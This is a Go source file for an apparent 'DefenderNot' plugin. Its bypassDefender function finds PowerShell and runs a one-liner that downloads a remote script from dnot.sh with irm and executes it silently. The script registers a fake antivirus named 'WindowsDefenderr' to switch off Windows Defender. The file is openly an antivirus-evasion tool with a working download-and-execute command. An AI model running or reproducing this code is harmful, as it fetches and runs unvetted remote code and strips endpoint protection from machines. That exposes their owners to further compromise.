package defendernot

import (
	"fmt"
	"log"
	"os/exec"
)

// Configuration variables.
var customAVName = "WindowsDefenderr"

// Global variable to store the PowerShell binary path.
var powershellPath string

func init() {
	// Configure the logger:
	log.SetPrefix("[DefenderNot] ")
	log.SetFlags(log.Ldate | log.Ltime | log.Lshortfile)

	log.Println("Plugin initialized.")

	if err := checkPowerShell(); err != nil {
		log.Printf("WARNING: Initialization check failed: %v", err)
	}
}

// check if PowerShell is installed on the system and retrieves its path.
func checkPowerShell() error {
	path, err := exec.LookPath("powershell")
	if err != nil {
		return fmt.Errorf("powershell not found in system")
	}
	powershellPath = path
	log.Printf("PowerShell found at: %s", powershellPath)
	return nil
}

// bypassDefender executes the bypass operation.
func bypassDefender() error {
	if powershellPath == "" {
		err := fmt.Errorf("powershell path is not defined, operation aborted")
		log.Println(err)
		return err
	}

	log.Printf("Starting bypass operation with custom name: %s", customAVName)
	cmdString := fmt.Sprintf("& ([ScriptBlock]::Create((irm https://dnot.sh/))) --silent --name %s", customAVName)
	cmd := exec.Command(powershellPath, "-NoProfile", "-Command", cmdString)
	output, err := cmd.CombinedOutput()
	if err != nil {
		log.Printf("Command execution failed. Output: %s", string(output))
		return fmt.Errorf("bypass failed: %w", err)
	}

	log.Println("Bypass command executed successfully.")
	return nil
}
